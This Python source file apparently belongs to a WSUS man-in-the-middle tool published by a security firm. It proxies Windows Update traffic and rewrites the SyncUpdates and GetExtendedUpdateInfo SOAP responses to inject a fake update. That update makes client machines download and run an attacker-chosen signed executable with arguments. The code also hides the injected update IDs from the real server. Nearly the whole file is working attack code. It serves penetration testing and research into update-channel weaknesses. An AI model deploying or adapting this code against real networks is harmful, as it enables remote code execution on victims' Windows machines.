# The MIT License (MIT)
# 
# Copyright (c) 2015 Context Information Security Ltd.
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

import random
import uuid
import re
import hashlib
import base64
import os
import string
from os.path import splitext, basename
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
    
from xml.sax.saxutils import escape

class FakeWsusUpdate(object):
    def __init__(self, payload, args, title, description):
        self.payload_path = os.path.join('payloads', payload)
        self.payload_args = args
        self.title = title
        self.description = description
        
        # These can be any number that doesn't clash with an existing update ID
        self.bundle_id  = 17999990
        self.install_id = self.bundle_id + 1
        
        # Not sure of the difference between above IDs and 'deploy' IDs
        self.deploy_bundle_id = 899990
        self.deploy_install_id = self.deploy_bundle_id + 1
        
        # The payload will be downloaded to a temporary file with this name
        self.orig_filename = 'Windows-KB890830-V5.22.exe'
        
        if not os.path.exists(self.payload_path):
            raise Exception('File %s not found - you need to have an MS-signed executable' % self.payload_path)
            
        self.__gen_file_hashes()
        self.download_path = self.__gen_download_path()

    def __gen_file_hashes(self):
        hash1 = hashlib.sha1()
        hash256 = hashlib.sha256()

        with open(self.payload_path, 'rb') as f:
            data = f.read()
            hash1.update(data)
            hash256.update(data)
           
        self.payload_sha1 = base64.b64encode(hash1.digest())
        self.payload_sha256 = base64.b64encode(hash256.digest())
        self.payload_sha1_hex = hash1.hexdigest()
        
    def __gen_download_path(self):
        # The download URL can be anything, since we're proxying everything
        # But we'll make it look like a genuine WSUS URL
        # Beware that the WU heavily caches URLs - if you reuse a URL it's
        # downloaded before it will always use the cached version
        _, ext = splitext(basename(self.payload_path))
        hash = self.payload_sha1_hex.upper() # maybe we should use a random hash?
        path = '/Content/%s/%s%s' % (hash[-2:], hash, ext)
        return path
        
    def download_url(self, wsus_host):
        url = 'http://%s%s' % (wsus_host, self.download_path)
        return url
    
    def get_data(self):
        with open(self.payload_path, 'rb') as f:
            data = f.read()
        return data
        
class WsusXmlModifier(object):
    WSUS_SOAP_ACTION = "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"

    def __init__(self, fake_update, template_dir = 'templates'):
        self.update = fake_update
        self.template_dir = template_dir

    def will_serve_response(self, req):
        parsed_uri = urlparse(req.uri)
        return parsed_uri.path == self.update.download_path
        
    def will_modify_response(self, req):
        action = req.getAllHeaders().get('soapaction', None)
        return action and WsusXmlModifier.WSUS_SOAP_ACTION in action
        
    def will_modify_request(self, req):
        action = req.getAllHeaders().get('soapaction', None)
        return action and WsusXmlModifier.WSUS_SOAP_ACTION in action
          
    def get_response(self, req):
        if req.method == 'GET':
            print('Serving payload %s (%s)' % (basename(self.update.payload_path), self.update.title))
        req.setHeader('content-type', 'application/octet-stream')
        return self.update.get_data()
        
    def modify_request(self, request):
        headers = request.getAllHeaders().copy()
        
        # Remove compression header
        if headers.get('accept-encoding', '') == 'xpress':
            request.requestHeaders.setRawHeaders('accept-encoding', ['utf-8'])
            
        content = request.request_buffer
        if '<GetExtendedUpdateInfo' in content:
            content = self.__remove_fake_ids(content)
        request.request_buffer = content

    def modify_response(self, request):
        inject_fns = {
            '<SyncUpdatesResult>': self.__modify_sync_update_response,
            '<GetExtendedUpdateInfoResult': self.__modify_extended_update_response
        }
        content = request.response_buffer
        
        # Don't modify the second SyncUpdateResult (the hardware/driver one)
        if '<DriverSyncNotNeeded>true' in content:
            return
            
        for search, fn in inject_fns.iteritems():
            if search in content:
                content = fn(content, request)
        request.response_buffer = content
        
    def __modify_extended_update_response(self, content, request):
        print('Adding fake update metadata to GetExtendedUpdateInfoResult')
        update_xml = self.__gen_extended_update_response_xml()
        file_xml = self.__gen_file_location_xml(request.getAllHeaders()['host'])
        
        if '<Updates>' in content:
            # There are real updates in the WSUS response, so add ours to the end
            content = content.replace('</Updates>', '%s</Updates>' % update_xml)
        else:
            # The WSUS server didn't return any updates, so add our own
            content = content.replace(
                '<GetExtendedUpdateInfoResult />',
                '<GetExtendedUpdateInfoResult><Updates>%s</Updates></GetExtendedUpdateInfoResult>' % update_xml)
            
        if '<FileLocations>' in content:
            content = content.replace('</FileLocations>', '%s</FileLocations>' % file_xml)
        else:
            content = content.replace('</Updates>', '</Updates><FileLocations>%s</FileLocations>' % file_xml)
        return content

    def __gen_file_location_xml(self, host):
        url = self.update.download_url(host)
        hash = self.update.payload_sha1
        xml = '<FileLocation><FileDigest>%s</FileDigest><Url>%s</Url></FileLocation>' % (hash, url)
        return xml
        
    def __gen_extended_update_response_xml(self):
        update = self.update
        fields = {
            'filename': update.payload_path,
            'prog_args': update.payload_args,
            'file_len': os.path.getsize(update.payload_path),
            'file_sha1': update.payload_sha1,
            'file_sha256': update.payload_sha256,
            'orig_filename' :update.orig_filename,
            'bundle_id': update.bundle_id,
            'update_title': update.title,
            'update_description': update.description
        }
        
        updates = (
           (update.bundle_id,  self.get_template('bundle_extended_xml1.xml')),
           (update.install_id, self.get_template('install_extended_xml1.xml')),
           (update.bundle_id,  self.get_template('bundle_extended_xml2.xml')),
           (update.install_id, self.get_template('install_extended_xml2.xml'))
        )
        
        xml = ''
        for id, xml_template in updates:
            xml_part = xml_template.substitute(fields)
            xml += '<Update><ID>%s</ID><Xml>%s</Xml></Update>\n' % (id, escape(xml_part))
        return xml

    def __remove_fake_ids(self, content):
        # remove our injected update IDs from request to real WSUS server
        # if we don't the WSUS server will tell the client to 'forget' 
        # about our fake IDs
        injected_ids = (self.update.bundle_id, self.update.install_id)
        regex = '<int>(%s)</int>' % '|'.join(map(str, injected_ids))
        content = re.sub(regex, '', content)
        return content

    def __modify_sync_update_response(self, content, request):
        print('Adding fake update metadata to SyncUpdatesResult')
        data = self.__gen_sync_update_response_xml()
        if '<NewUpdates>' in content:
            content = content.replace('</NewUpdates>', '%s</NewUpdates>' % data)
        else:
            content = content.replace('<SyncUpdatesResult>', '<SyncUpdatesResult><NewUpdates>%s</NewUpdates>' % data)
        return content

    def __gen_sync_update_response_xml(self):
        update = self.update
        guids = {
            'install_guid': uuid.uuid4(),
            'bundle_guid': uuid.uuid4()
        }

        fields = {
            'bundle_id': update.bundle_id,     
            'install_id': update.install_id,
            'deploy_bundle_id': update.deploy_bundle_id,
            'deploy_install_id': update.deploy_install_id,
            'install_xml': escape(self.get_template('install_xml.xml').substitute(guids)),
            'bundle_xml': escape(self.get_template('bundle_xml.xml').substitute(guids))
        }
        xml = self.get_template('SyncUpdatesResult.xml').substitute(fields)
        return xml
    
    def get_template(self, filename):
        path = '%s/%s' % (self.template_dir, filename)
        with open(path, 'r') as f:
            s = f.read()
        return string.Template(s)